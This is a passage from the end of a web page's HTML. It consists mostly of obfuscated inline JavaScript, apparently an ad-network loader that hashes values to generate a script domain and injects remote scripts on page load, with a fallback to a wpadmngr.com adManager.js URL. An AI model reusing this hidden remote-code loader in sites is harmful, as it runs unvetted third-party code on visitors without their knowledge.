Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>